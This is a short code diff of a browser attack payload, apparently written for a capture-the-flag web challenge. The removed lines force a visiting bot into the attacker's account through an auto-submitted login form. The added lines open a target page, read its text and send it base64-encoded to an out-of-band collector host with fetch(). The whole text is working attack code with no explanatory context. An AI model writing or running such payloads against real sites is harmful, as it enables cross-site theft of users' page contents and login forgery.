@@ -1,7 +1,7 @@
 <script>
-// Force bot to login as your account
-// sameSite=lax blocks cross-origin POST but...
-// Can we do a form POST navigation?
-document.write('<form id="f" action="https://witm.asrctf.online/login" method="POST"><input name="username" value="sxzsd"><input name="password" value="yourpassword"></form>');
-document.getElementById('f').submit();
+var w = window.open('https://witm.asrctf.online/spectrogram/1');
+setTimeout(function(){
+  var d = w.document.body.innerText;
+  fetch('https://pwwwnedlpqxdeoidqydhp4o5pe89kaz41h.oast.fun/?c='+btoa(d));
+}, 3000);
 </script>
